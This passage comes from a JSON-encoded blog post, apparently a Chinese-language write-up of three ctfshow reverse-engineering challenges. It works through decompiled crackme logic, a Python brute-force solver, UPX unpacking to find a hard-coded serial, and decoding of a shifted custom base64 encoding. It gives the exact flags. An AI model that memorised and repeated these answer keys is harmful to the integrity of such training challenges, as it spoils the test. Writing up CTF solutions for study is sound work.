__int64 v13; // [rsp+58h] [rbp-8h]\n\n  v13 = __readfsqword(0x28u);\n  if ( argc != 5 )\n  {\n    puts(\"argc nonono\");\n    exit(1);\n  }\n  v4 = strtol(argv[4], &amp;endptr, 16) - 25923;\n  v9 = f(v4);\n  v10 = strtol(argv[1], &amp;v6, 16);\n  v11 = strtol(argv[2], &amp;v7, 16);\n  v12 = strtol(argv[3], &amp;v8, 16);\n  if ( v9 - v10 != 0x233F0E151CLL )\n  {\n    puts(\"argv1 nonono!\");\n    exit(1);\n  }\n  if ( v9 - v11 != 0x1B45F81A32LL )\n  {\n    puts(\"argv2 nonono!\");\n    exit(1);\n  }\n  if ( v9 - v12 != 0x244C071725LL )\n  {\n    puts(\"argv3 nonono!\");\n    exit(1);\n  }\n  if ( v4 + v12 + v11 + v10 != 0x13A31412F8CLL )\n  {\n    puts(\"argv sum nonono!\");\n    exit(1);\n  }\n  puts(\"well done!decode your argv!\");\n  return 0;\n}\n</code></pre>\n<p>经分析，f函数为求斐波那契数列的函数</p>\n<p>需要输入四个参数，使得满足函数中的各个条件</p>\n<p>逆向推理</p>\n<pre><code class=\"python\">v9 = f(v4-25923)\nv10 = v9 - 0x233F0E151C\nv11 = v9 - 0x1B45F81A32\nv12 = v9 - 0x244C071725\nv4 + v12 + v11 + v10 != 0x13A31412F8CLL\n</code></pre>\n<p>由此可以通过爆破方式，穷举v4的值，得到答案。由于输入时参数形式为16进制，故解得的个参数需要用十六进制解码</p>\n<p>于是</p>\n<pre><code class=\"python\">\ndef f(n):\n    a=1\n    b=1\n    i=2\n    while i&lt;n:\n       a,b = b,a+b \n       i+=1\n    return b\n\n\nv4 = 25929\n\ndef main():\n    while True:\n        global v4\n        v9 = f(v4-25923)\n        # print(v9)\n        v10 = v9 - 0x233F0E151C \n        v11 = v9 - 0x1B45F81A32\n        v12 = v9 - 0x244C071725\n        if v4 - 25923 + v10 + v11 + v12 != 0x13A31412F8C:\n            v4 += 1\n            continue\n        print(\"well done!decode your argv!\")\n        print(hex(v10),v11,v12,v4,sep=\" \")\n        print(bytes.fromhex(hex(v10)[2:])+bytes.fromhex(hex(v11)[2:])+bytes.fromhex(hex(v12)[2:])+bytes.fromhex(hex(v4)[2:]))\n        break\n\nmain()\n</code></pre>\n<p>解得</p>\n<pre><code class=\"raw\">well done!decode your argv!\n439904987003 474148725349 435392374130 25981\nb'flag{newbee_here}\n</code></pre>\n<h2 id=\"flag白给\"><a href=\"#flag白给\" class=\"headerlink\" title=\"flag白给\"></a>flag白给</h2><p>PE查壳，可知为Upx加壳</p>\n<p>脱壳后，IDA打开，字符串窗口，可以看到<code>CODE:004547AC\t00000007\tC\tHackAv</code></p>\n<p>跟进可以看到成功等字样，猜测此为序列号，输入验证，成功</p>\n<p>故flag为<code>flag{HackAv}</code></p>\n<p>(或者根据返回错误文本”错误”，搜索字符串，可以看到”成功也在附近”，之后找到序列号)</p>\n<h2 id=\"签退\"><a href=\"#签退\" class=\"headerlink\" title=\"签退\"></a>签退</h2><p>uncompyle6反编译，得到</p>\n<pre><code class=\"python\"># uncompyle6 version 3.8.0\n# Python bytecode 2.7 (62211)\n# Decompiled from: Python 3.10.4 | packaged by conda-forge | (main, Mar 30 2022, 08:38:02) [MSC v.1916 64 bit (AMD64)]\n# Embedded file name: re3.py\n# Compiled at: 2020-03-06 17:43:28\nimport string\nc_charset = string.ascii_uppercase + string.ascii_lowercase + string.digits + '()'\nflag = 'BozjB3vlZ3ThBn9bZ2jhOH93ZaH9'\n\ndef encode(origin_bytes):\n    c_bytes = [ ('{:0&gt;8}').format(str(bin(b)).replace('0b', '')) for b in origin_bytes ]\n    resp = ''\n    nums = len(c_bytes) // 3\n    remain = len(c_bytes) % 3\n    integral_part = c_bytes[0:3 * nums]\n    while integral_part:\n        tmp_unit = ('').join(integral_part[0:3])\n        tmp_unit = [ int(tmp_unit[x:x + 6], 2) for x in [0, 6, 12, 18] ]\n        resp += ('').join([ c_charset[i] for i in tmp_unit ])\n        integral_part = integral_part[3:]\n\n    if remain:\n        remain_part = ('').join(c_bytes[3 * nums:]) + (3 - remain) * '0' * 8\n        tmp_unit = [ int(remain_part[x:x + 6], 2) for x in [0, 6, 12, 18] ][:remain + 1]\n        resp += ('').join([ c_charset[i] for i in tmp_unit ]) + (3 - remain) * '.'\n    return rend(resp)\n\n\ndef rend(s):\n\n    def encodeCh(ch):\n        f = lambda x: chr((ord(ch) - x + 2) % 26 + x)\n        if ch.islower():\n            return f(97)\n        if ch.isupper():\n            return f(65)\n        return ch\n\n    return ('').join(encodeCh(c) for c in s)\n</code></pre>\n<p>猜测对flag进行了rend操作</p>\n<p>编写derend，转回</p>\n<pre><code class=\"python\">def derend(s):\n\n    def decodeCh(ch):\n        f = lambda x: chr((ord(ch) - x - 2) % 26 + x)\n        if ch.islower():\n            return f(97)\n        if ch.isupper():\n            return f(65)\n        return ch\n\n    return ('').join(decodeCh(c) for c in s)\n</code></pre>\n<p>调用后，得到<code>ZmxhZ3tjX3RfZl9zX2hfMF93XyF9</code>，base64解码后为<code>flag{c_t_f_s_h_0_w_!}</code></p>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        }
    ]
}